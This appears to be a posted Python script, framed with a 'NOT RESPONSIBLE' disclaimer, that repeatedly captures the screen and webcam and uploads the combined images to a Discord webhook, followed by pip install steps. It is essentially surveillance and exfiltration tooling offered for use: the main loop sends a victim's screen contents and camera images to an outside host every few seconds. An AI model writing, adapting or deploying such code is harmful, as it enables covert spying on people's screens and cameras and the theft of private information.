@@ -1,0 +1,68 @@
+Python Code For Webcam + Screen Recording Tools Via Discord Webhook| NOT RESPONSIBLE
+import cv2
+import numpy as np
+import pyautogui
+import requests
+import time
+
+# Replace with your Discord webhook URL
+WEBHOOK_URL = 'YOUR_DISCORD_WEBHOOK_URL'
+
+def send_to_discord(image):
+    _, buffer = cv2.imencode('.jpg', image)
+    image_bytes = buffer.tobytes()
+    
+    files = {
+        'file': ('image.jpg', image_bytes, 'image/jpeg')
+    }
+    
+    response = requests.post(WEBHOOK_URL, files=files)
+    return response.status_code
+
+def main():
+    # Start webcam capture
+    cap_webcam = cv2.VideoCapture(0)
+
+    if not cap_webcam.isOpened():
+        print("Error: Could not open webcam.")
+        return
+
+    try:
+        while True:
+            # Capture the screen
+            screen = pyautogui.screenshot()
+            screen = cv2.cvtColor(np.array(screen), cv2.COLOR_RGB2BGR)
+
+            # Capture webcam frame
+            ret, frame = cap_webcam.read()
+            if not ret:
+                print("Error: Failed to capture webcam image.")
+                break
+
+            # Resize screen for better fit (optional)
+            screen = cv2.resize(screen, (640, 480))  # Adjust as necessary
+
+            # Combine screen and webcam
+            combined = np.hstack((screen, frame))
+
+            # Display the combined frame
+            cv2.imshow('Screen and Webcam', combined)
+
+            # Send the frame to Discord every 5 seconds
+            if time.time() % 5 < 1:  # Check if it's time to send
+                status_code = send_to_discord(combined)
+                print(f'Sent to Discord, status code: {status_code}')
+            
+            # Wait for a short time to avoid high CPU usage
+            time.sleep(0.1)
+
+    finally:
+        cap_webcam.release()
+        cv2.destroyAllWindows()
+
+if __name__ == "__main__":
+    main()
+
+Go To Terminal Any Type:
+pip install opencv-python pyautogui numpy requests
+pip install Pillow
